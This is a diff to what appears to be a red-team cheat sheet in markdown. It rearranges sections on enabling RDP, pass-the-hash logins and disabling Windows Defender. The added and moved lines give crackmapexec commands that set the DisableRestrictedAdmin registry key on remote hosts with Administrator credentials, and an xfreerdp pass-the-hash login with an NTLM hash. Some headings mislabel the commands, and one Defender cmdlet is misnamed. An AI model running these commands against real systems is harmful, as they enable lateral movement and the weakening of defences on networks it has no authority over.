@@ -1696,6 +1696,14 @@ klist
 
 ### RDP 
 
+Enable RDP for admin accounts
+```bash
+enableRDP='reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+cme smb [snip] -x '$enableRDP' 
+
+cme smb [snip] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
 ```bash=
 xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:USER /pth:<NTLMHash> /v:HOST 
 
@@ -2385,13 +2393,6 @@ Remove color from script output
 ```bash=
 sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"
 ```
-
-Disable defender 
-```bash
-cme smb host -u Administrator -p password -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
-# feel free to add --exec-method msiexec if you encounter issues
-```
-
 ## Linux Priv Esc
 
 ## Linux Persistence
@@ -2430,9 +2431,10 @@ Powershell
 Get-MPPreference -DisableRealTimeMonitoring $true
 ```
 
-Registry
-```
-reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+CME/NXC
+```bash
+cme smb host -u Administrator -p password -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+# feel free to add --exec-method msiexec if you encounter issues
 ```
 
 ## Payload Generation
